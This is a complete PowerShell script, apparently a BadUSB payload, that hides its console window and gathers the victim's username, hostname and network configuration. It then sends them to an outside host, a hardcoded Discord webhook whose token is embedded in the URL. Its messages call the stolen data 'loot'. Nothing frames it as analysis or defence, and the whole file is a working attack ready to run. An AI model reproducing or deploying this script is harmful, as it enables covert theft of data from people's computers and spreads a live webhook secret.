$pshost = get-host
$pswindow = $pshost.ui.rawui
$newsize = $pswindow.windowsize
$newsize.height = 1
$newsize.width = 1
$pswindow.windowsize = $newsize

$url = "https://discord.com/api/webhooks/1099988207770284032/buJwlMj72i0sUMPe-xBAh4u7G_3PCY7yrEhl_VuyN7n47GusvYhcwLrK8N5EiBLXn4eI"

# get username, hostname, and IP config
$username = $env:USERNAME
$hostname = $env:COMPUTERNAME
$ipconfig = ipconfig /all | Select-String -Pattern "IPv4","Carte", "interface"|Out-String
$ipconfigok = [Text.Encoding]::ASCII.GetString([Text.Encoding]::GetEncoding("Cyrillic").GetBytes($ipconfig))

# format message
$message = @{
    "username" = "Red team operator"
    "avatar_url"= "https://assetsio.reedpopcdn.com/modern-warfare-2-red-team-141.jpeg?width=1200&height=1200&fit=bounds&quality=70&format=jpg&auto=webp"
    "content" = "Bad usb payload triggered !"
    "embeds" = @(
        @{
            "title" = ":smiling_imp: There is your loot ! :smiling_imp:"
            "description" = "**Username:** $username`r`n**Hostname:** $hostname"
            "fields" = @(
                @{
                    "name" = "Ipconfig:"
                    "value" = "$ipconfigok"
                }
            )  
        }
    )
} | ConvertTo-Json -Depth 4

Invoke-RestMethod -Uri $url -Method POST -Body $message -ContentType "application/json"
exit
